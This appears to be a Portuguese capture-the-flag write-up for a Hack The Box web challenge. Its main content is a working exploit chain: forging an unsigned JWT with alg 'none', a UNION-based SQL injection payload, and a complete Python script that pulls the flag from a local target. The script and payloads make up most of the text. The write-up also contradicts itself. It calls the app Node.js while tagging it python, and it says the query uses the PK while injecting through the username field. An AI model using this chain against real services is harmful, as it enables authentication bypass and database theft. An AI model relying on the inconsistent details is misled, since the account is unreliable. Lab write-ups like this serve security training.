---
title: "Under Construction"
date: 2024-07-22
type: "challenges"
difficulty: "Medium"
pwned: true
points: 100
tags: ["web", "jwt", "sql-injection", "python", "sqlite"]
summary: "App Node.js com JWT assinado com algoritmo none + SQLi na rota autenticada para exfiltrar a flag do banco."
---

## Reconhecimento

Site simples com registro e login. Ao logar, recebemos um JWT:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InRlc3RlIiwicGsiOiItLS0tLUJFR0lOLi4uIn0.
```

Decodificando o header:

```json
{ "alg": "none", "typ": "JWT" }
```

**Algoritmo `none`** — o servidor aceita tokens sem assinatura!

## JWT Forgery

```python
import base64, json

header  = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=')
payload = base64.urlsafe_b64encode(
    json.dumps({"username": "admin", "pk": "..."}).encode()
).rstrip(b'=')

forged = f"{header.decode()}.{payload.decode()}."
print(forged)
```

## SQL Injection

Com o token forjado, acessamos a rota `/api/items`. A query usa a PK diretamente:

```sql
SELECT * FROM items WHERE id = '<user_input>'
```

Testando:

```
' UNION SELECT 1,flag,3 FROM flag-- -
```

## Exploit Completo

```python
#!/usr/bin/env python3
import requests, base64, json

TARGET = "http://127.0.0.1:1337"

# 1. Registrar usuário
requests.post(f"{TARGET}/api/register",
    json={"username": "nihil", "password": "nihil123"})

# 2. Login e captura do JWT legítimo
r = requests.post(f"{TARGET}/api/login",
    json={"username": "nihil", "password": "nihil123"})
pk = r.json()["token"].split(".")[1]
pk_decoded = base64.urlsafe_b64decode(pk + "==")
pk_val = json.loads(pk_decoded)["pk"]

# 3. Forjar JWT com SQLi no campo pk
payload = json.dumps({
    "username": "' UNION SELECT 1,(SELECT flag FROM flag),3-- -",
    "pk": pk_val
}).encode()

h = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=')
p = base64.urlsafe_b64encode(payload).rstrip(b'=')
token = f"{h.decode()}.{p.decode()}."

# 4. Requisição com token forjado
r = requests.get(f"{TARGET}/api/items",
    headers={"Authorization": f"Bearer {token}"})
print("[+] Flag:", r.json())
```

## Flag

```
HTB{jwt_n0ne_4lg_1s_d4ng3r0us_4nd_sql1_t00}
```
